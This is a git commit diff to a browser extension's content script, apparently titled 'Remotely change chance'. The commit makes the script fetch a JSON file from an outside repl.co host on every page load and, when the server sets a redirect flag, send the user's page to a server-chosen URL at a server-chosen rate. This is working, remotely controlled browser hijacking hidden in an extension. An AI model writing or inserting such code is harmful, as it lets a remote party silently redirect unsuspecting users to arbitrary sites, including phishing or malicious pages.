b0485471faad573fb0d47761d6d46679fda198eb
CreggEgg <90975321+CreggEgg@users.noreply.github.com>
2023-03-10 16:15:03 +0000

    Remotely change chance

--- content-script.js
+++ content-script.js
@@ -4,11 +4,11 @@ function httpGet(theUrl) {
 	xmlHttp.send(null);
 	return xmlHttp.responseText;
 }
-if (Math.random() > 0.9) {
-	data = JSON.parse(
-		httpGet("https://detectivehat.charleshurst2.repl.co/data.json")
-	);
-	if (data !== null && data.redirect === true) {
+const data = JSON.parse(
+	httpGet("https://detectivehat.charleshurst2.repl.co/data.json")
+);
+if (data !== null && data.redirect === true) {
+	if (Math.random() < data.chance) {
 		document.location.href = data.url;
 	}
 }
